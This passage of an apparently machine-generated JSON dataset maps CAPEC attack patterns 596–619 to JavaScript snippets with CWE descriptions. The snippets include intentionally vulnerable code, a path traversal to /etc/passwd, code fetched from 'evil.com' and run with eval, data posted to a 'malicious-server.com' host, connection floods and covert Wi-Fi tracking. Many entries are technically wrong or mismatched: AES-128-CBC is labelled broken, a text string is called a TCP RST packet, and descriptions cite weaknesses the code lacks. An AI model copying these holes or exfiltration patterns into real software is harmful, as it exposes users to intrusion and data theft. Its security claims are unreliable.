        "description": "This code snippet demonstrates the CAPEC 'Connection Reset' attack pattern by exploiting multiple CWEs. It sets up a server and a client that communicate over UDP, but with improper verification of the source of the communication channel (CWE-940) and without ensuring message integrity during transmission (CWE-924). The client sends a message to the server, but the destination is not correctly specified (CWE-941). A malicious client captures and replays the message to bypass authentication (CWE-294). Additionally, multiple clients are allowed to bind to the same port, making it possible to steal or spoof services on that port (CWE-605)."
    },
    {
        "capec_id": "596",
        "code_snippet": "const net = require('net');\nconst http = require('http');\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nconst server = http.createServer((req, res) => {\n  // CWE-918: Server-Side Request Forgery (SSRF)\n  const url = req.url;\n  const proxyReq = http.request(url, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res);\n  });\n\n  // CWE-294: Authentication Bypass by Capture-replay\n  proxyReq.on('response', (proxyRes) => {\n    const authHeader = proxyRes.headers['set-cookie'];\n    if (authHeader) {\n      // Replay the authentication header\n      res.setHeader('Set-Cookie', authHeader);\n    }\n  });\n\n  // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n  proxyReq.write(`GET ${url} HTTP/1.1\\r\\n`);\n  proxyReq.write(`Host: ${req.headers.host}\\r\\n`);\n  proxyReq.write('\\r\\n');\n  proxyReq.end();\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\nconst rstPacket = new Buffer('R\\r\\n', 'utf8');\nconst socket = new net.Socket();\nsocket.connect(8080, 'localhost', () => {\n  socket.write(rstPacket);\n  socket.end();\n});",
        "description": "This code snippet demonstrates a vulnerable HTTP proxy server that can be exploited using TCP RST packets to terminate the connection. The server is vulnerable to Server-Side Request Forgery (SSRF), Authentication Bypass by Capture-replay, Inconsistent Interpretation of HTTP Requests, and Improper Neutralization of CRLF Sequences in HTTP Headers. An attacker can inject a TCP RST packet to terminate the connection after making an HTTP GET request."
    },
    {
        "capec_id": "597",
        "code_snippet": "const fs = require('fs');\n\nfunction getFile(file) {\n  const filePath = './uploads/' + file;\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      console.error(err);\n    } else {\n      console.log(data);\n    }\n  });\n}\n\n// Vulnerable usage:\ngetFile('../../../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates the Path Traversal vulnerability. The getFile function takes a file name as input and reads its contents from the ./uploads directory. However, an attacker can provide a malicious file name with ../ sequences to traverse to a parent directory and access sensitive files outside the intended directory, such as /etc/passwd."
    },
    {
        "capec_id": "598",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\n// CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nfunction getHostName(ip) {\n  return new Promise((resolve, reject) => {\n    dns.reverse(ip, (err, hostname) => {\n      if (err) reject(err);\n      else resolve(hostname);\n    });\n  });\n}\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nasync function makeRequest(ip, hostname) {\n  const url = `http://${hostname}/malicious-code.js`;\n  const req = http.get(url, (res) => {\n    res.on('data', (data) => {\n      // CWE-494: Download of Code Without Integrity Check\n      eval(data);\n    });\n  });\n}\n\n// CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nasync function redirectUser(ip, hostname) {\n  const redirectUrl = `http://${hostname}/phishing-page`;\n  http.createServer((req, res) => {\n    res.writeHead(302, { Location: redirectUrl });\n    res.end();\n  }).listen(8080);\n}\n\n// CWE-918: Server-Side Request Forgery (SSRF)\nasync function makeSSRFRequest(ip, hostname) {\n  const url = `http://${hostname}/internal-system`;\n  http.get(url, (res) => {\n    console.log(res.statusCode);\n  });\n}\n\n// Main attack\nasync function dnsPoisoningAttack() {\n  const ip = '192.168.1.100';\n  const maliciousHostname = 'evil.com';\n  dns.setServers(['192.168.1.100']);\n  dns.resolve(maliciousHostname, 'A', (err, address) => {\n    if (err) console.error(err);\n    else {\n      getHostName(ip).then((hostname) => {\n        makeRequest(ip, hostname);\n        redirectUser(ip, hostname);\n        makeSSRFRequest(ip, hostname);\n      });\n    }\n  });\n}\n\ndnsPoisoningAttack();",
        "description": "This JavaScript code snippet demonstrates a DNS poisoning attack, which embodies the main idea of the CAPEC. It uses related CWEs for additional context, including CWE-350, CWE-941, CWE-494, CWE-601, and CWE-918. The code sets up a malicious DNS server, poisons the DNS cache, and then uses the poisoned DNS response to make malicious requests, download code without integrity checks, redirect users to untrusted sites, and perform server-side request forgery."
    },
    {
        "capec_id": "599",
        "code_snippet": "const satelliteSignal = { freq: 1234, data: 'sensitive_info' };\n\n// CWE-319: Cleartext transmission of sensitive information\nsocket.emit('satellite-signal', satelliteSignal);\n\n// CWE-923: Improper restriction of communication channel to intended endpoints\nconst jammer = new Socket('jammer-endpoint');\njammer.emit('disrupt-signal', { freq: 1234, data: 'malicious_data' });\n\n// CWE-924: Improper enforcement of message integrity during transmission\nsocket.on('satellite-signal', (signal) => {\n  // No integrity check or verification of the signal\n  console.log(signal.data);\n});",
        "description": "This code snippet demonstrates a vulnerable satellite communication system. It transmits sensitive information in cleartext (CWE-319) and does not properly restrict the communication channel to the intended endpoint (CWE-923). Additionally, it does not enforce message integrity during transmission, allowing a jammer to disrupt the signal and inject malicious data (CWE-924)."
    },
    {
        "capec_id": "600",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'user1': 'password1',\n  'user2': 'password2',\n  'user3': 'password3'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send('Login successful');\n  } else {\n    res.send('Invalid username or password');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses single-factor authentication with a simple username and password combination. The passwords are stored in plaintext and there is no mechanism to prevent brute-force attacks or limit the number of login attempts. Additionally, there is no password aging or expiration, and the system relies solely on the evaluation of a single condition (username and password match) to grant access."
    },
    {
        "capec_id": "601",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-924: No message integrity check\n    processMessage(data);\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\nconst client = new net.Socket();\nclient.connect(8080, 'localhost', () => {\n  console.log('Connected to server');\n  // CWE-406: Insufficient control of network message volume\n  for (let i = 0; i < 10000; i++) {\n    client.write('Hello, server!');\n  }\n});\n\n// CWE-923: Improper restriction of communication channel to intended endpoints\nconst maliciousServer = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext transmission of sensitive information\n    console.log(`Received sensitive data: ${data}`);\n  });\n});\nmaliciousServer.listen(8081, () => {\n  console.log('Malicious server listening on port 8081');\n});\n\n// CWE-421: Race condition during access to alternate channel\nconst alternateChannel = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    console.log(`Received data on alternate channel: ${data}`);\n  });\n});\nalternateChannel.listen(8082, () => {\n  console.log('Alternate channel listening on port 8082');\n});",
        "description": "This code snippet demonstrates a vulnerable server and client implementation in JavaScript, embodying the main idea of the CAPEC. The server does not ensure message integrity, allowing an adversary to modify messages during transmission (CWE-924). The client can be used to flood the server with traffic, overwhelming system resources and denying service to legitimate users (CWE-406). The malicious server demonstrates improper restriction of communication channels to intended endpoints, allowing unauthorized access (CWE-923). Sensitive information is transmitted in cleartext, making it vulnerable to sniffing (CWE-319). Finally, the alternate channel implementation is vulnerable to race conditions, allowing unauthorized access (CWE-421)."
    },
    {
        "capec_id": "602",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  dns.lookup('example.com', (err, address) => {\n    if (address) {\n      // Use an obsolete function to authenticate the user\n      var crypto = require('crypto');\n      var md5sum = crypto.createHash('md5');\n      md5sum.update(password);\n      var hashedPassword = md5sum.digest('hex');\n      if (hashedPassword === 'hashed_password_from_database') {\n        // Load a dynamic class to perform additional authentication steps\n        var authClass = require('./auth_class');\n        var auth = new authClass();\n        auth.performAdditionalAuthSteps(username);\n      }\n    }\n  });\n}\n\n// Use stored data from a file without proper protection\nvar fs = require('fs');\nvar storedData = fs.readFileSync('stored_data.txt', 'utf8');\nconsole.log(storedData);",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern, incorporating multiple weaknesses. It uses an obsolete function (crypto.createHash('md5')) for authentication, relies on DNS lookups for security decisions, loads a dynamic class for additional authentication steps, and stores sensitive data in a file without proper protection."
    },
    {
        "capec_id": "603",
        "code_snippet": "let socketConnections = [];\n\nfunction handleNewConnection() {\n  let socket = new WebSocket('ws://example.com');\n  socketConnections.push(socket);\n  socket.onmessage = function(event) {\n    // Process message\n  };\n  socket.onclose = function(event) {\n    // Remove socket from array\n  };\n}\n\nsetInterval(handleNewConnection, 1000);",
        "description": "This code snippet demonstrates a denial-of-service vulnerability by creating an unbounded number of WebSocket connections, leading to resource exhaustion. The handleNewConnection function is called every second, creating a new WebSocket connection and adding it to the socketConnections array without any limits or throttling (CWE-770). This can cause the system to fail or stop working due to the uncontrolled consumption of resources (CWE-400). The protection mechanism failure (CWE-693) is evident in the lack of restrictions on the number of connections that can be allocated. Additionally, this code can be exploited to create emergent resources (CWE-1229) and potentially lead to unauthorized error injection, degrading hardware redundancy (CWE-1334)."
    },
    {
        "capec_id": "604",
        "code_snippet": "const wifi = require('wifi');\nconst deauthFrame = Buffer.from('FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF', 'hex');\n\nwifi.startMonitoring();\n\nsetInterval(() => {\n  wifi.sendFrame(deauthFrame);\n}, 100);\n\nconst socket = require('socket.io-client')('http://localhost:3000');\n\nsocket.on('connect', () => {\n  console.log('Connected to the server.');\n});\n\nsocket.on('message', (message) => {\n  console.log(`Received message: ${message}`);\n});\n\n// No verification of the source of the message\nsocket.on('disconnect', () => {\n  console.log('Disconnected from the server.');\n});",
        "description": "This code snippet demonstrates a Wi-Fi deauthentication attack, which is an example of the CAPEC described. The code uses the 'wifi' module to start monitoring the Wi-Fi channel and send deauthentication frames at regular intervals, effectively jamming the channel. The code also establishes a socket.io connection to a server, but does not properly verify the source of incoming messages, making it vulnerable to CWE-940. Additionally, the code does not ensure the integrity of the messages during transmission, making it vulnerable to CWE-924. The code also does not restrict the communication channel to the intended endpoint, making it vulnerable to CWE-923. Furthermore, the code does not handle race conditions during access to alternate channels, making it vulnerable to CWE-421. Finally, the code transmits sensitive information in cleartext, making it vulnerable to CWE-319."
    },
    {
        "capec_id": "605",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst server = require('http').createServer(app);\nconst io = require('socket.io')(server);\n\napp.get('/', (req, res) => {\n  res.sendFile(__dirname + '/index.html');\n});\n\nio.on('connection', (socket) => {\n  socket.on('message', (message) => {\n    // CWE-924: No message integrity check\n    // CWE-940: No verification of source\n    io.emit('message', message);\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that establishes a communication channel with clients using WebSockets. The application does not verify the source of incoming messages (CWE-940) and does not ensure the integrity of the messages during transmission (CWE-924). An attacker can exploit this by sending false status messages or introducing high levels of noise on signaling channels, disrupting the communication between the client and the server. The application also transmits sensitive information in cleartext (CWE-319) and does not protect against physical side channels (CWE-1300). Additionally, the channel is accessible by non-endpoint actors (CWE-300), allowing an attacker to access or influence the channel."
    },
    {
        "capec_id": "606",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateEncryption(device, operator) {\n  let encryptionMode;\n  if (device === 'old_device' && operator === 'malicious_operator') {\n    encryptionMode = 'A5/0'; // no encryption\n  } else if (device === 'old_device' && operator === 'rogue_operator') {\n    encryptionMode = 'A5/1'; // weak encryption\n  } else {\n    encryptionMode = 'A5/2'; // weak encryption\n  }\n\n  const hardcodedKey = 'my_secret_key';\n  const cipher = crypto.createCipher(encryptionMode, hardcodedKey);\n  return cipher;\n}\n\nconst device = 'old_device';\nconst operator = 'malicious_operator';\nconst cipher = negotiateEncryption(device, operator);\nconst message = 'Hello, World!';\nconst encryptedMessage = cipher.update(message, 'utf8', 'hex');\nconsole.log(encryptedMessage);",
        "description": "This code snippet demonstrates the CAPEC of forcing a mobile device to use no encryption or weak encryption. It uses CWE-757 by allowing the negotiation of encryption modes, CWE-326 by using weak encryption, CWE-924 by not ensuring message integrity, CWE-321 by using a hard-coded cryptographic key, and CWE-327 by using a broken cryptographic algorithm."
    },
    {
        "capec_id": "607",
        "code_snippet": "const redundantSystem = {\n  componentA: {\n    execute: function() {\n      // Simulating a redundant system\n      if (Math.random() < 0.5) {\n        throw new Error('Component A failed');\n      }\n    }\n  },\n  componentB: {\n    execute: function() {\n      // Simulating a redundant system\n      if (Math.random() < 0.5) {\n        throw new Error('Component B failed');\n      }\n    }\n  }\n};\n\n// CWE-693: Protection Mechanism Failure\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectError(component) {\n  // Simulating an unauthorized error injection\n  component.execute = function() {\n    throw new Error('Injected error');\n  };\n}\n\n// CWE-653: Improper Isolation or Compartmentalization\nfunction executeSystem() {\n  try {\n    redundantSystem.componentA.execute();\n  } catch (error) {\n    // Improper isolation, allowing the error to propagate\n    throw error;\n  }\n}\n\n// CWE-1332: Improper Handling of Faults that Lead to Instruction Skips\n// CWE-1298: Hardware Logic Contains Race Conditions\nfunction handleFault() {\n  // Simulating a faulty hardware logic\n  if (Math.random() < 0.5) {\n    // Skipping security-critical instructions\n    return;\n  }\n  // Simulating a race condition\n  if (Math.random() < 0.5) {\n    // Undermining security guarantees\n    return 'insecure_state';\n  }\n}\n\ninjectError(redundantSystem.componentA);\nexecuteSystem();\nhandleFault();",
        "description": "This code snippet demonstrates the CAPEC of obstructing system component interactions, leading to a degraded system state. It incorporates CWE-693 (Protection Mechanism Failure), CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy), CWE-653 (Improper Isolation or Compartmentalization), CWE-1332 (Improper Handling of Faults that Lead to Instruction Skips), and CWE-1298 (Hardware Logic Contains Race Conditions). The code simulates a redundant system with two components, injects an unauthorized error, and demonstrates improper isolation and handling of faults, ultimately leading to a degraded system state."
    },
    {
        "capec_id": "608",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a broken or risky cryptographic algorithm (CWE-327)\nconst cipher = crypto.createCipher('aes-128-cbc', 'hardcoded_key'); // CWE-321: Use of Hard-coded Cryptographic Key\n\n// Inadequate encryption strength (CWE-326)\nconst encryptedData = cipher.update('sensitive_data', 'utf8', 'hex');\n\n// Selection of less-secure algorithm during negotiation (CWE-757)\nfunction negotiateAlgorithm() {\n  const availableAlgorithms = ['aes-128-cbc', 'des-ede3-cbc'];\n  return availableAlgorithms[0]; // Selecting a weaker algorithm\n}\n\n// Improper protection of physical side channels (CWE-1300)\nconst sideChannelLeak = () => {\n  const powerConsumptionPattern = [];\n  for (let i = 0; i < 100; i++) {\n    powerConsumptionPattern.push(Math.random());\n  }\n  return powerConsumptionPattern;\n};",
        "description": "This code snippet demonstrates the CAPEC of using cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption. It uses a broken or risky cryptographic algorithm (AES-128-CBC), a hard-coded cryptographic key, inadequate encryption strength, and selects a less-secure algorithm during negotiation. Additionally, it includes a function that simulates an improper protection of physical side channels, leaking sensitive information through power consumption patterns."
    },
    {
        "capec_id": "609",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = { username: 'admin', password: 'password123' };\n  res.send(sensitiveInfo);\n});\n\nconst untrustedServer = 'http://malicious-server.com';\n\napp.post('/sendData', (req, res) => {\n  const data = req.body;\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', untrustedServer, true);\n  xhr.send(JSON.stringify(data));\n});",
        "description": "This code snippet demonstrates a vulnerable server that transmits sensitive information in cleartext and does not properly verify the source of incoming requests. The '/sensitiveData' endpoint returns sensitive information in plaintext, which can be intercepted by malicious actors. The '/sendData' endpoint sends data to an untrusted server without verifying its origin, making it vulnerable to man-in-the-middle attacks. The code also uses implicit intent for transmitting sensitive data, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "610",
        "code_snippet": "const net = require('net');\nconst debugMode = true;\n\nconst server = net.createServer((socket) => {\n  if (debugMode) {\n    socket.on('data', (data) => {\n      // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n      console.log('Received data:', data);\n      // CWE-319: Cleartext Transmission of Sensitive Information\n      socket.write('Sensitive information: ' + process.env.SECRET_KEY);\n    });\n  }\n\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  socket.on('error', (err) => {\n    console.error('Error occurred:', err);\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-201: Insertion of Sensitive Information Into Sent Data\nsetInterval(() => {\n  const socket = new net.Socket();\n  socket.connect(8080, 'localhost', () => {\n    socket.write('Injected data: ' + process.env.SECRET_KEY);\n  });\n}, 1000);\n\n// CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\nsetInterval(() => {\n  for (let i = 0; i < 100; i++) {\n    const socket = new net.Socket();\n    socket.connect(8080, 'localhost', () => {\n      socket.write('Amplified data');\n    });\n  }\n}, 1000);",
        "description": "This JavaScript code snippet demonstrates the CAPEC of injecting data into mobile technology traffic to disrupt communications or conduct additional surveillance operations. It includes several CWEs: CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), CWE-201 (Insertion of Sensitive Information Into Sent Data), and CWE-406 (Insufficient Control of Network Message Volume (Network Amplification))."
    },
    {
        "capec_id": "611",
        "code_snippet": "const maliciousDomain = 'examp1e.com'; // One bit different from the trusted domain 'example.com'\n\nfunction redirectUser(url) {\n  const userInput = document.getElementById('urlInput').value;\n  if (userInput.includes('example.com')) {\n    // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n    window.location.href = userInput.replace('example.com', maliciousDomain);\n  }\n}\n\nfunction downloadCode() {\n  const scriptUrl = 'https://' + maliciousDomain + '/maliciousScript.js';\n  // CWE-494: Download of Code Without Integrity Check\n  const scriptTag = document.createElement('script');\n  scriptTag.src = scriptUrl;\n  document.head.appendChild(scriptTag);\n}\n\nfunction captureReplay() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', 'https://' + maliciousDomain + '/captureReplay', true);\n  xhr.send();\n  // CWE-294: Authentication Bypass by Capture-replay\n  xhr.onload = function() {\n    if (xhr.status === 200) {\n      const response = xhr.responseText;\n      // Use the captured response to bypass authentication\n    }\n  };\n}\n\nfunction sensitiveQuery() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', 'https://' + maliciousDomain + '/sensitiveData?username=admin&password=password', true);\n  xhr.send();\n  // CWE-598: Use of GET Request Method With Sensitive Query Strings\n}",
        "description": "This code snippet demonstrates a BitSquatting attack, where a malicious domain is registered with a single bit difference from a trusted domain. It includes several CWEs, including CWE-601 (URL Redirection to Untrusted Site), CWE-494 (Download of Code Without Integrity Check), CWE-294 (Authentication Bypass by Capture-replay), and CWE-598 (Use of GET Request Method With Sensitive Query Strings). The code redirects users to the malicious domain, downloads malicious code, captures and replays authentication requests, and sends sensitive data in the query string."
    },
    {
        "capec_id": "612",
        "code_snippet": "const wifi = require('wifi');\nconst macAddresses = {};\n\nwifi.scan((error, networks) => {\n  if (error) {\n    console.error(error);\n  } else {\n    networks.forEach((network) => {\n      const macAddress = network.mac;\n      if (!macAddresses[macAddress]) {\n        macAddresses[macAddress] = [];\n      }\n      macAddresses[macAddress].push(network.ssid);\n    });\n  }\n});\n\nsetInterval(() => {\n  wifi.scan((error, networks) => {\n    if (error) {\n      console.error(error);\n    } else {\n      networks.forEach((network) => {\n        const macAddress = network.mac;\n        if (macAddresses[macAddress]) {\n          console.log(`User with MAC address ${macAddress} is connected to ${network.ssid}`);\n        }\n      });\n    }\n  });\n}, 10000);\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that scans for nearby WiFi networks, logs their MAC addresses, and associates them with the connected users. It then periodically scans for these MAC addresses to track the users. This code embodies the CAPEC of tracking users by their MAC addresses and relates to CWEs 201, 300, 421, 1316, and 529, as it transmits sensitive information (MAC addresses) over an unverified channel, allowing unauthorized access and potential race conditions."
    },
    {
        "capec_id": "613",
        "code_snippet": "const wifi = require('wifi');\n\nfunction trackUser(ssid) {\n  const wifiInterface = wifi.interface;\n  wifiInterface.on('scan', (networks) => {\n    networks.forEach((network) => {\n      if (network.ssid === ssid) {\n        console.log(`User is connected to ${ssid}`);\n        // Send tracking data to server\n        const xhr = new XMLHttpRequest();\n        xhr.open('POST', 'https://tracking-server.com/track', true);\n        xhr.send(`User is connected to ${ssid}`);\n      }\n    });\n  });\n}\n\n// Example usage:\nconst ssidToTrack = 'public_wifi';\ntrackUser(ssidToTrack);\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript function that tracks a user's WiFi connections by listening for WiFi management frame messages containing the Service Set Identifier (SSID). The function uses the 'wifi' module to scan for nearby networks and checks if the user is connected to a specific SSID. If the user is connected, the function sends tracking data to a server, potentially disclosing sensitive information. The code is vulnerable to CWE-201 (Insertion of Sensitive Information Into Sent Data), CWE-300 (Channel Accessible by Non-Endpoint), CWE-1290 (Incorrect Decoding of Security Identifiers), CWE-1192 (Improper Identifier for IP Block used in System-On-Chip (SOC)), and CWE-1302 (Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC))."
    },
    {
        "capec_id": "614",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (DES)\nconst desKey = 'my_secret_key';\nconst desCipher = crypto.createCipher('des-cbc', desKey);\n\n// CWE-326: Inadequate encryption strength (using DES with a short key)\nconst shortKey = 'very_short_key';\nconst shortDesCipher = crypto.createCipher('des-cbc', shortKey);\n\n// CWE-1277: Firmware not updateable (hardcoded firmware version)\nconst firmwareVersion = '1.0';\n\n// CWE-1297: Unprotected confidential information on device (hardcoded sensitive data)\nconst sensitiveData = 'my_secret_data';\n\n// CWE-1191: On-chip debug and test interface with improper access control (exposing internal registers)\nconst internalRegisters = {\n  debugMode: true,\n  testMode: true\n};\n\n// CAPEC: SIM card attack using OTA updates via cryptographically-secured SMS messages\nfunction sendOTAUpdate(simCard, firmwareUpdate) {\n  // Sign the firmware update with the cracked DES key\n  const signedUpdate = desCipher.update(firmwareUpdate);\n  // Send the signed update to the SIM card via SMS\n  simCard.sendSMS(signedUpdate);\n}\n\n// Example usage\nconst simCard = {\n  sendSMS: function(sms) {\n    console.log(`Sending SMS: ${sms}`);\n  }\n};\nconst firmwareUpdate = 'new_firmware_version';\nsendOTAUpdate(simCard, firmwareUpdate);",
        "description": "This code snippet demonstrates a SIM card attack using over-the-air (OTA) updates via cryptographically-secured SMS messages. It uses a broken or risky cryptographic algorithm (DES), inadequate encryption strength, and hardcoded sensitive data. The firmware is not updateable, and internal registers are exposed without proper access control. The code sends a signed firmware update to the SIM card, which can be exploited by an attacker."
    },
    {
        "capec_id": "615",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\napp.use(express.json());\n\nconst options = {\n  key: fs.readFileSync('server-key.pem'),\n  cert: fs.readFileSync('server-cert.pem')\n};\n\nconst server = https.createServer(options, app);\n\nserver.listen(3000, () => {\n  console.log('Server started on port 3000');\n});\n\napp.post('/api/data', (req, res) => {\n  const data = req.body;\n  // No verification of the source of the request\n  console.log('Received data:', data);\n  res.send('Data received');\n});",
        "description": "This code snippet demonstrates a vulnerable Wi-Fi access point that intercepts and captures Wi-Fi data traffic. It sets up an HTTPS server using Node.js and Express.js, but does not properly verify the source of incoming requests (CWE-940). The server also does not ensure the integrity of the communication channel (CWE-300, CWE-923), allowing an adversary to intercept and modify the data in transit (CWE-924). Additionally, the data is transmitted in cleartext, making it vulnerable to sniffing by unauthorized actors (CWE-319)."
    },
    {
        "capec_id": "616",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/resource', (req, res) => {\n  const userInput = req.query.location;\n  const fs = require('fs');\n  const path = require('path');\n  const filePath = path.join(__dirname, userInput);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.status(404).send('Resource not found');\n    } else {\n      res.send(data);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server that allows an adversary to provide a malicious version of a resource at a similar location. The server uses user input to construct a file path, which can be manipulated to access sensitive information or create an emergent resource. The server does not properly verify the source of the request, allowing an attacker to initiate a request from an unexpected origin. Additionally, the server transmits private resources into a new sphere, making them available to untrusted parties. The code also uses an untrusted search path, which can point to resources not under the server's direct control."
    },
    {
        "capec_id": "617",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\napp.use(express.json());\n\nconst rogueBaseStation = https.createServer((req, res) => {\n  if (req.headers['device-id'] === 'targeted_device') {\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify({ 'command': 'retransmit_data' }));\n  }\n});\n\nrogueBaseStation.listen(443, () => {\n  console.log('Rogue base station listening on port 443');\n});\n\nconst retransmitDevice = https.request({\n  hostname: 'rogue-base-station.com',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'device-id': 'targeted_device'\n  }\n}, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    const command = JSON.parse(data).command;\n    if (command === 'retransmit_data') {\n      // retransmit data without verifying the source of the command\n      console.log('Retransmitting data...');\n    }\n  });\n});\n\nretransmitDevice.write('');\nretransmitDevice.end();",
        "description": "This code snippet demonstrates a vulnerable retransmission device that connects to a rogue base station without properly verifying the source of the communication channel. The rogue base station sends a command to the retransmission device, which retransmits data without verifying the integrity of the message or the identity of the base station. This code embodies CWE-940, CWE-300, CWE-924, CWE-923, and CWE-421."
    },
    {
        "capec_id": "618",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst smsApi = 'https://sms-api.com/send';\n\napp.post('/location', (req, res) => {\n  const phoneNumber = req.body.phoneNumber;\n  const locationAreaCode = req.body.locationAreaCode;\n  const message = `Broadcast message to verify location in ${locationAreaCode}`;\n\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const data = {\n    phoneNumber: phoneNumber,\n    locationAreaCode: locationAreaCode,\n    message: message\n  };\n\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  https.post(smsApi, data, (err, res) => {\n    if (err) {\n      console.error(err);\n    } else {\n      console.log(`Message sent to ${phoneNumber}`);\n    }\n  });\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  // No verification of the source of the request\n\n  // CWE-927: Use of Implicit Intent for Sensitive Communication\n  // Implicit intent to send message to other applications\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  // No verification of the identity of actors at both ends of the communication channel\n});",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that allows an attacker to verify a target's location using cellular broadcast messages. The code receives a POST request with a phone number and location area code, and then sends a broadcast message to the phone number using an SMS API. The code is vulnerable to multiple CWEs, including insertion of sensitive information into sent data, improper enforcement of message integrity, improper verification of the source of the communication channel, use of implicit intent for sensitive communication, and channel accessible by non-endpoint."
    },
    {
        "capec_id": "619",
        "code_snippet": "const wifi = require('wifi');\nconst cellular = require('cellular');\n\nasync function trackSignalStrength() {\n  const wifiSignal = await wifi.getSignalStrength();\n  const cellularSignal = await cellular.getSignalStrength();\n  const locationData = {\n    wifiSignalStrength: wifiSignal,\n    cellularSignalStrength: cellularSignal,\n    deviceId: getDeviceId(),\n    timestamp: new Date().getTime()\n  };\n  sendLocationData(locationData);\n}\n\nfunction sendLocationData(data) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://example.com/location', true);\n  xhr.send(JSON.stringify(data));\n}\n\nfunction getDeviceId() {\n  // IMSI tracking or WiFi MAC Address Tracking\n  return 'IMSI_1234567890' || 'MAC_ADDRESS_1234567890';\n}\n\nsetInterval(trackSignalStrength, 1000);",
        "description": "This code snippet demonstrates a vulnerable implementation of a location tracking system that uses WiFi and cellular signal strengths to determine the device's location. It embodies the CAPEC by passively monitoring the signal strength and using it to identify the source location. The related CWEs are also reflected in the code: CWE-201 (sensitive information sent in the data), CWE-1300 (improper protection of physical side channels), CWE-940 (improper verification of source of communication channel), CWE-924 (improper enforcement of message integrity), and CWE-432 (dangerous signal handler not disabled during sensitive operations)."
    },
    {
        "capec_id": "620",
